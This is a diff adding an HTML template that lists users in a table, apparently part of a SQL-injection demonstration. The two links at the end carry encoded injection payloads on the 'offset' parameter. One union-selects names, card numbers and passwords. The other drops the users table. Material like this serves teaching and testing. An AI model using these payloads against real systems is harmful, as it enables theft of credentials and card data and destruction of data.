@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>User list</title>
+</head>
+<body>
+  <h1>Users</h1>
+  <table border="1">
+    <thead>
+      <tr>
+      {% for field in fields %}
+        <th>{{ field }}</th>
+      {% endfor %}
+      </tr>
+    </thead>
+    <tbody>
+    {% for user in users %}
+      <tr>
+        {% for field in fields %}
+          <td>{{ user[field] }}</td>
+        {% endfor %}
+      </tr>
+    {% endfor %}
+    </tbody>
+  </table>
+  <a href='?offset=0+union+select+id%2C+concat_ws%28"%5Cn"%2C+name%2C+card%2C+password%29+as+name%2C+email+from+users%3B'>Select all fields and users</a>
+  <a href="?offset=0%3B+drop+table+users%3B">Drop users table</a>
+</body>
+</html>
